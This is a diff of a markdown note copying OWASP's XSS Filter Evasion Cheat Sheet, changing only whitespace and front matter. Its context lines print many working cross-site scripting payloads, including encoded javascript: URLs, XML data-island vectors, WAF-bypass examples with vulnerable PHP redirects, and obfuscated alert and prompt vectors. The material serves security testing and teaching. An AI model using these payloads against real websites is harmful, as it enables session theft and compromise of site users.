@@ -1,19 +1,20 @@
 ---
 tags:
-    - frontend/xss
-    - security
-id: ""
+  - frontend/xss
+  - security
 created: 2020-05-01T02:09:59.846Z
 modified: 2020-05-01T02:10:27.307Z
 ---
+
 # XSS Filter Evasion Cheat Sheet | OWASP
-#frontend/xss #security 
+
+#frontend/xss #security
 
 [Source](https://owasp.org/www-community/xss-filter-evasion-cheatsheet "Permalink to XSS Filter Evasion Cheat Sheet | OWASP")
 
-**Author:** Jim Manico 
+**Author:** Jim Manico
 
-**Contributor(s):** Abdullah Hussam, Michael McCabe, Luke Plant, Randomm, David Shaw, ALange, Matt Tesauro, Adam Caudill, Anandu, DhirajMishra, Ono, Bill Sempf, Dan Wallis, Peter Mosmans, Dominique Righetto 
+**Contributor(s):** Abdullah Hussam, Michael McCabe, Luke Plant, Randomm, David Shaw, ALange, Matt Tesauro, Adam Caudill, Anandu, DhirajMishra, Ono, Bill Sempf, Dan Wallis, Peter Mosmans, Dominique Righetto
 
 This article is focused on providing application security testing professionals with a guide to assist in Cross Site Scripting testing. The initial contents of this article were donated to OWASP by RSnake, from his seminal XSS Cheat Sheet, which was at: `http://ha.ckers.org/xss.html`. That site now redirects to its new home here, where we plan to maintain and enhance it. The very first OWASP Prevention Cheat Sheet, the [Cross Site Scripting Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html), was inspired by RSnake’s XSS Cheat Sheet, so we can thank him for our inspiration. We wanted to create short, simple guidelines that developers could follow to prevent XSS, rather than simply telling developers to build apps that could protect against all the fancy tricks specified in rather complex attack cheat sheet, and so the [OWASP Cheat Sheet Series](https://owasp.org/www-project-cheat-sheets/) was born.
 
@@ -569,21 +570,21 @@ This example only works in Firefox, but it’s better than the above vector in F
     a="get";
     b="URL(\"";
     c="javascript:";
-    d="alert('XSS');\")"; 
+    d="alert('XSS');\")";
     eval(a+b+c+d);
 
 ## XML data island with CDATA obfuscation
 
 This XSS attack works only in IE and Netscape 8.1 in IE rendering engine mode) - vector found by Sec Consult while auditing Yahoo:
 
-    <XML ID="xss"><I><B><IMG SRC="javas<!-- -->cript:alert('XSS')"></B></I></XML> 
+    <XML ID="xss"><I><B><IMG SRC="javas<!-- -->cript:alert('XSS')"></B></I></XML>
     <SPAN DATASRC="#xss" DATAFLD="B" DATAFORMATAS="HTML"></SPAN>
 
 ## Locally hosted XML with embedded JavaScript that is generated using an XML data island
 
 This is the same as above but instead referrs to a locally hosted (must be on the same server) XML file that contains your cross site scripting vector. You can see the result here:
 
-    <XML SRC="xsstest.xml" ID=I></XML>  
+    <XML SRC="xsstest.xml" ID=I></XML>
     <SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML></SPAN>
 
 ## HTML+TIME in XML
@@ -707,7 +708,7 @@ Again padding is allowed, although you must keep it above 4 total characters per
 
 Let’s mix and match base encoding and throw in some tabs and newlines - why browsers allow this, I’ll never know). The tabs and newlines only work if this is encapsulated with quotes:
 
-    <A HREF="h 
+    <A HREF="h
     tt  p://6	6.000146.0x7.147/">XSS</A>
 
 ### Protocol resolution bypass
@@ -750,7 +751,7 @@ Extra dot for absolute DNS:
 
 ### Content replace as attack vector
 
-Assuming `http://www.google.com/` is programmatically replaced with nothing). I actually used a similar attack vector against a several separate real world XSS filters by using the conversion filter itself (here is an example) to help create the attack vector (IE: `java&\#x09;script:` was converted into `java	script:`, which renders in IE, Netscape 8.1+ in secure site mode and Opera):
+Assuming `http://www.google.com/` is programmatically replaced with nothing). I actually used a similar attack vector against a several separate real world XSS filters by using the conversion filter itself (here is an example) to help create the attack vector (IE: `java&\#x09;script:` was converted into `java script:`, which renders in IE, Netscape 8.1+ in secure site mode and Opera):
 
     <A HREF="http://www.google.com/ogle.com/">XSS</A>
 
@@ -848,7 +849,7 @@ If an attacker managed to push XSS through the filter, WAF wouldn’t be able to
     Exploitation: /?xss=document.cookie
 
 XSS via request Redirection.
- • Vulnerable code:
+• Vulnerable code:
 
     ...
     header('Location: '.$_GET['param']);
@@ -857,7 +858,7 @@ XSS via request Redirection.
 As well as:
 
     ...
-    header('Refresh: 0; URL='.$_GET['param']); 
+    header('Refresh: 0; URL='.$_GET['param']);
     ...
 
 • This request will not pass through the WAF:
@@ -889,7 +890,7 @@ As well as:
     <iframe src=javascript&colon;alert&lpar;document&period;location&rpar;>
     <form><a href="javascript:\u0061lert(1)">X
     </script><img/*%00/src="worksinchrome&colon;prompt(1)"/%00*/onerror='eval(src)'>
-    <style>//*{x:expression(alert(/xss/))}//<style></style> 
+    <style>//*{x:expression(alert(/xss/))}//<style></style>
     On Mouse Over​
     <img src="/" =_=" title="onerror='prompt(1)'">
     <a aa aaa aaaa aaaaa aaaaaa aaaaaaa aaaaaaaa aaaaaaaaa aaaaaaaaaa href=j&#97v&#97script:&#97lert(1)>ClickMe
@@ -897,7 +898,7 @@ As well as:
     <form><button formaction=javascript&colon;alert(1)>CLICKME
     <input/onmouseover="javaSCRIPT&colon;confirm&lpar;1&rpar;"
     <iframe src="data:text/html,%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%28%31%29%3C%2F%73%63%72%69%70%74%3E"></iframe>
-    <OBJECT CLASSID="clsid:333C7BC4-460F-11D0-BC04-0080C7055A83"><PARAM NAME="DataURL" VALUE="javascript:alert(1)"></OBJECT> 
+    <OBJECT CLASSID="clsid:333C7BC4-460F-11D0-BC04-0080C7055A83"><PARAM NAME="DataURL" VALUE="javascript:alert(1)"></OBJECT>
 
 ## Filter Bypass Alert Obfuscation
 
@@ -918,4 +919,4 @@ Robert “RSnake” Hansen
 # Contributors
 
 Adam Lange
- Mishra Dhiraj
+Mishra Dhiraj
